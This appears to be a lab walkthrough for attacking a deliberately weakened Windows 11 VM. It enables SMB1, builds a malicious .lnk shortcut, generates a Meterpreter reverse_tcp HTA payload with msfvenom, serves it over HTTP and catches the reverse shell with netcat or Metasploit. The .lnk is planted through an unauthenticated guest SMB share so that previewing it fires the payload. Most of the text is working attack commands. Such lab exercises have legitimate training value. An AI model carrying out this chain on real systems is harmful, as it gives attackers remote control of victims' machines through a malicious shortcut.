# Steps:

Simulate SMB vulnerability in Win11 VM:
- Enable SMB1:
    - From the start menu, search for `Turn Windows features on or off`.
    - Select `SMB 1.0 ...` then select `Ok`, the installation will start, then the VM will be restarted.
- In admin PowerShell, enable scripting `Set-ExecutionPolicy RemoteSigned -Scope LocalMachine`.
- Download `smb1-vulnerability.ps1` and run it in the admin PowerShell window.

Steps in Kali:
- Create a shortcut file:
    - Run `lnk-creator.sh`, make sure the *.lnk file is in the Desktop.
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.8.10 LPORT=4444 -f hta-psh > exploit.hta`.
    - Run `python3 -m http.server 80` and leave it running.
    - Open new terminal and use `nc -lvnp 4444`, or use Metasploit:
        - use exploit/multi/handler
        - set payload windows/meterpreter/reverse_tcp
        - set LHOST 192.168.8.10
        - set LPORT 4444
        - run
    - Open new terminal smb client
        - Use `smbclient //192.168.8.40/Sharing -U guest`.
        - There is no password for guest user, so just hit `Enter` key for password.
        - Use `put exploit.lnk`, to upload the created link file to Win11.
        - In Win11, open `Sharing` folder and click on `exploit.lnk` to be previewed, this will activate the malware.
